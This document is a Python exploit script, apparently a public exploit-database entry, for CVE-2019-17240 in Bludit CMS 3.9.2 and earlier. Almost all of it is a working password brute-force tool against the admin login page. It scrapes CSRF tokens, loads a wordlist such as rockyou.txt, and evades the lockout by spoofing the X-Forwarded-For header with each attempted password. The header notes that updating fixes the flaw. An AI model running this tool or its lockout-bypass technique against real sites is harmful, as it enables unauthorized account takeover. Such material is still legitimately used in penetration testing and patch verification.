#########################INFO##############################
# Title: Bludit 3.9.2 - Auth Bruteforce Bypass 
# Author: Bruno Sergio
# Date: 2021-06-07
# Vendor Homepage: https://www.bludit.com
# Software Link: https://github.com/bludit/bludit/releases/tag/3.9.2
# Version: <= 3.9.2
# CVE: CVE-2019-17240
# Mitigation: Update to a version later than 3.9.2
#########################USAGE#############################
# Eg.: python3 bloodit.py -d http://localhost/ -w rockyou.txt

#!/usr/bin/python3

import requests
import optparse
import re
import time
from sys import exit
from signal import signal, SIGINT
from requests.api import post
from requests.sessions import Request
from termcolor import colored
from pwn import *

start_time = time.time()

def keyHandler(sig, frame):
	print(colored("\n[!] Ctrl + C pressed. Program ended...\n", "red"))
	print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
	sys.exit(1)
signal.signal(signal.SIGINT, keyHandler)

def getOptions():
  parser = optparse.OptionParser(description='Bludit Auth Brute Force Mitigation Bypass.', epilog='Eg.: python3 bloodit.py -d http://localhost/ -w rockyou.txt')
  parser.add_option('-d', '--domain', dest='domain', help='Bludit login page to be bruteforced.')
  parser.add_option('-w', '--wordlist', dest='wordlist', help='Path to the wordlist that will be used.')
  parser.add_option('-u', '--username', dest='username', help='Username. By default uses "admin".', default='admin')
  (options, arguments) = parser.parse_args()
  if not options.domain:
    log.failure(colored("Please specify the target domain, use --help for more info.\n", "yellow"))
    sys.exit(1)
  elif not options.wordlist:
    log.failure(colored("Please specify an wordlist path, use --help for more info.\n", "yellow"))
    sys.exit(1)
  return options

def banner():
  print("""
   ___  __             ________ 
  / _ )/ /__  ___  ___/ /  _/ /_
 / _  / / _ \/ _ \/ _  // // __/
/____/_/\___/\___/\_,_/___/\__/                                
Bludit Brute Force Mitigation Bypass
Created by: Bruno Sergio
  """)

def prepareWordlist(wordlist):
  try:
    wordlist = open (wordlist, 'r').read().splitlines()
    passwords = []
    for word in wordlist:
      passwords.append(word)
    return passwords
  except Exception:
    log.failure(colored("Wordlist not found.\n", "red"))
    sys.exit(1)

def prepareURL(domain):
  if domain.startswith('http://') or domain.startswith('https://'):
    url = re.sub(r'https?:\/\/', 'http://', domain)
    if domain.endswith('/admin') or domain.endswith('/admin/'):
      url = re.sub(r'\/admin\/?', '/admin/', url)
    elif not domain.endswith('/admin') or not domain.endswith('/admin/'):
      url += '/admin/' 
  elif not domain.startswith('http://') or not domain.startswith('https://'):
    url = f'http://{domain}'
    if domain.endswith('/admin') or domain.endswith('/admin/'):
      url = re.sub(r'\/admin\/?', '/admin/', url)
    elif not domain.endswith('/admin') or not domain.endswith('/admin/'):
      if domain.endswith('/'):
        url = re.sub(r'\/$', '/admin/', url)
      else:
        url += '/admin/'
  statusCheck(url, domain)
  return url

def statusCheck(url, domain):
  try:
    check = requests.get(url, timeout=6)
    if check.status_code == 200:
      pass
    else:
      log.failure(colored(f"The domain '{domain}' is invalid or down, use --help for more info.\n", "red"))
      sys.exit(1)
  except:
    log.failure(colored(f"The domain '{domain}' is invalid or down, use --help for more info.\n", "red"))
    sys.exit(1)

def bruteForce(url, username, passwords):
  process = log.progress("Brute Force")
  process.status("Initiating brute force attack")
  time.sleep(2)
  
  for password in passwords:
    try:
      session = requests.Session()
      login = session.get(url)
      
      tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', login.text)[0]

      data = {
        'tokenCSRF': tokenCSRF,
        'username': username,
        'password': password,
        'save': ''
      }

      headers = {
        'Referer': url+'login',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'X-Forwarded-For': password
      }

      post_request = session.post(
        url, data=data,
        headers=headers,
        allow_redirects=False
        )
   
      process.status(f"Testing with the password: {password}")
      if 'location' in post_request.headers:
        if '/admin/dashboard' in post_request.headers['location']:
          log.success(colored(f"Password found! Use '{username}:{password}' to login", "green"))
          sys.exit(0)
      elif "has been blocked" in post_request.text:
        log.failure(colored("IP address has been blocked. Try again in a few minutes", "red"))
        sys.exit(1)
      else:
        pass
    except Exception as e:
      log.error(str(e))

def main():
  try:
    banner()
    options = getOptions()
    passwords = prepareWordlist(options.wordlist)
    url = prepareURL(options.domain)
    bruteForce(url, options.username, passwords)
    print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
    sys.exit(0)
  except Exception as e:
    log.error(str(e))

if __name__ == '__main__':
  main()
